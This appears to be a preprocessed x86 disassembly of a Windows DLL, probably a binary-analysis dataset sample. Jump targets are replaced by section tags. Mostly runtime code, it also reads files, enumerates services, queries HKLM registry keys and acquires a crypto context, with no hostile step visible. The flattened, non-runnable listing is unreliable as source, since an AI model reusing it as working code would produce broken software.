push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10036f49
push 0x3c
mov eax sub_1008564a
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_10037d2f
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x10
and [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x34 ]
dec esi
cmp [ ebp - 0x20 ] 0x10
jae r-xdata
mov eax [ ebp - 0x38 ]
add eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
lea ebx [ eax + 0x1 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x34 ]
call sub_1004ca10
cmp [ ebp - 0x20 ] 0x10
mov edi [ ebp - 0x44 ]
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_1002c8c0
mov eax esi
call sub_1004642f
retn 0x20
add edi 0xc
xor eax eax
jle r-xdata
push edi
lea eax [ ebp - 0x48 ]
push eax
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_10026eb0
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push [ ebp - 0x40 ]
lea ecx [ ebp + 0xc ]
sub esi eax
add ebx eax
call sub_1003c746
test esi esi
jne r-xdata
test eax eax
js r-xdata
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
push ebx
call sub_1007fa90
pop ecx
inc eax
jmp r-xdata
sub_10037063
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000723f
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100370b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008632c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x13c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0x144 ] esi
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x12c ] ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x4 ] 0x3
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x61
call sub_10045930
push esi
lea edx [ ebp - 0x128 ]
lea ecx [ ebp - 0x4c ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x128 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x18
call sub_10045930
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x138 ]
lea ecx [ ebp - 0x90 ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x138 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
mov eax 0x4
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x120 ]
mov eax 0x158
call sub_10045930
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x120 ]
call sub_10062be0
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
mov eax 0x5
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x130 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
mov eax 0x6
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0xd8 ]
mov eax 0x13e
call sub_10045930
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x140 ]
lea ecx [ ebp - 0xd8 ]
call sub_10062be0
test eax eax
jne r-xdata
lea esi [ ebp - 0x140 ]
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x140 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
lea esi [ ebp - 0x140 ]
mov [ eax ] dx
call sub_1002b580
lea esi [ ebp - 0x130 ]
call sub_1002b580
lea esi [ ebp - 0x138 ]
call sub_1002b580
lea esi [ ebp - 0x128 ]
call sub_1002b580
cmp edi ebx
jl r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov eax 0x7
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_100374b5
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100589c2
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_10037500
push ebp
mov ebp esp
push ecx
push ebx
push edi
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov [ ebp - 0x4 ] ebx
call [ GetFileSize@IAT ]
mov ecx [ ebp - 0x4 ]
mov esi eax
sub esi ecx
cmp eax 0xffffffff
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
test eax eax
jne r-xdata
cmp ecx ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push 0x0
push ecx
push esi
push eax
push edi
call [ ReadFile@IAT ]
cmp eax 0x1
je r-xdata
push edi
lea ebx [ eax + 0x3 ]
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov ebx 0x2
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx 0x4
sub_100375b7
push ebp
mov ebp esp
push 0x8
push 0x1
push r--data
push 0x0
push [ ebp + 0x8 ]
call [ CryptAcquireContextW@IAT ]
neg eax
sbb eax eax
and eax 0xfffffffe
add eax 0x2
pop ebp
retn 0x4
sub_100375e0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0xabc
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
mov [ ebp - 0xab0 ] edi
xor ebx ebx
mov [ ebp - 0xac0 ] ebx
mov [ ebp - 0xaac ] ebx
mov [ ebp - 0xabc ] ebx
mov [ ebp - 0xacc ] ebx
mov [ ebp - 0xab4 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
lea edx [ ebp - 0xab8 ]
lea eax [ ebx + 0x1 ]
call sub_10058f40
lea edx [ ebp - 0xaa4 ]
lea eax [ ebx + 0x2 ]
call sub_10058f40
lea edx [ ebp - 0xaa8 ]
xor eax eax
call sub_10058f40
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
mov edx 0x30c
lea ecx [ ebp - 0x690 ]
test eax eax
mov eax ecx
je r-xdata
sub esi ecx
xor edi edi
lea ebx [ ebp - 0xaa4 ]
sub ebx ecx
jmp r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
lea eax [ ebp - 0xaa8 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1004e6c0
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ ebp - 0xaa8 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1004e6c0
test eax eax
jne r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea edx [ ebp - 0xaa4 ]
push edx
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ ebp - 0xaa8 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
mov edi [ ebp - 0xab0 ]
lea edx [ ebp - 0xab8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ ebp - 0xaa4 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa8 ]
push eax
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
call [ GetProcessHeap@IAT ]
mov ebx eax
mov [ ebp - 0xaa4 ] ebx
mov [ ebp - 0x4 ] 0x0
push 0x4
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov edi eax
mov [ ebp - 0xac0 ] edi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100379f1
mov eax [ ebp - 0xabc ]
jmp r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac4 ]
push edx
lea eax [ ebp - 0xab4 ]
push eax
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push edi
mov esi [ EnumServicesStatusExW@IAT ]
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xab4 ]
push ecx
push 0x8
push ebx
call [ HeapAlloc@IAT ]
mov [ ebp - 0xaac ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac4 ]
push edx
lea eax [ ebp - 0xacc ]
push eax
mov ecx [ ebp - 0xab4 ]
push ecx
mov edx [ ebp - 0xaac ]
push edx
push 0x3
push 0x10
push 0x0
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x4
call sub_10058f40
lea edx [ ebp - 0x30 ]
mov eax 0x3
call sub_10058f40
xor esi esi
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x898 ]
push ecx
mov ecx 0x104
call sub_10017c80
imul esi esi 0x2c
mov edx [ ebp - 0xaac ]
mov eax [ esi + edx ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x898 ]
call sub_1004e6c0
lea ecx [ ebp - 0xab8 ]
push ecx
push 0x20119
push 0x0
mov edx ebx
push edx
push 0x80000002
mov esi [ RegOpenKeyExW@IAT ]
call esi
test eax eax
jne r-xdata
mov esi [ ebp - 0xac8 ]
inc esi
jmp r-xdata
lea eax [ ebp - 0xab8 ]
push eax
lea ecx [ ebp - 0x690 ]
push ecx
call sub_100197c0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xac8 ] esi
cmp esi [ ebp - 0xac4 ]
jae r-xdata
lea edx [ ebp - 0xab0 ]
push edx
push 0x20119
push 0x0
mov eax ebx
push eax
push 0x80000002
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0xaa0 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
lea edi [ ebp - 0xab0 ]
mov eax 0x104
call sub_10031460
add esp 0x8
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa0 ]
push eax
call [ PathFileExistsW@IAT ]
mov [ ebp - 0xabc ] eax
test eax eax
jne r-xdata
sub_100379f1
mov eax [ ebp - 0xac0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xaac ]
test eax eax
je r-xdata
push eax
call [ CloseServiceHandle@IAT ]
retn
push eax
push 0x0
mov ecx [ ebp - 0xaa4 ]
push ecx
call [ HeapFree@IAT ]
sub_10037a1d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
sub eax [ ebp + 0x8 ]
sar eax 0x1
push eax
push [ ebp + 0x8 ]
push 0x1
call [ GetStringTypeW@IAT ]
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_10037a3e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10044649
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_1008301c
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_1008307e
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_1007fa90
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_10083173
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_1008356d
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_1008301c
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_10083506
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_1008356d
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_10083506
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_10057f0f
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_10040783
add esp 0x10
sub_10037c2f
push 0x10
mov eax sub_100855af
call sub_100624bc
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10034ec0
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10034a80
mov esi [ ebp + 0x28 ]
mov ebx [ ebp + 0x20 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
jmp r-xdata
cmp al 0x20
je r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10013ab8
retn 0x24
or [ ebx ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov al [ ebp + 0x11 ]
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
movzx eax [ ebp + 0x11 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
or [ ebx ] 0x2
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
sub_10037d2f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004023e
add esp 0x18
pop ebp
retn
sub_10037d5b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_1002fb6b
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10035d06
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_10037e00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1000831a
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_1003f800
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_1004efe0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_1004efe0
pop esi
pop ebx
pop ebp
retn 0x8
sub_10037ef5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov ebx ecx
mov eax [ ebx ]
push edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ebx ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx ebx
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
